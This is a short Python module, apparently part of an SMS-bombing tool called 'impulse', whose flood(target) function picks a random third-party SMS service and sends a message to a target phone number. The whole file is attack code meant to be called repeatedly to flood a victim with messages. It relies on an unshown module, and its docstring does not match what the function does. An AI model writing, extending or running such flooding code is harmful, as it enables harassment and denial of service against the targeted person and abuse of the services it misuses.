import random

import impulse.SMS.sendRequest as request

__services = request.getServices()


def flood(target):
    """Get services list."""
    service = random.choice(__services)
    service = request.Service(service)
    service.sendMessage(target)
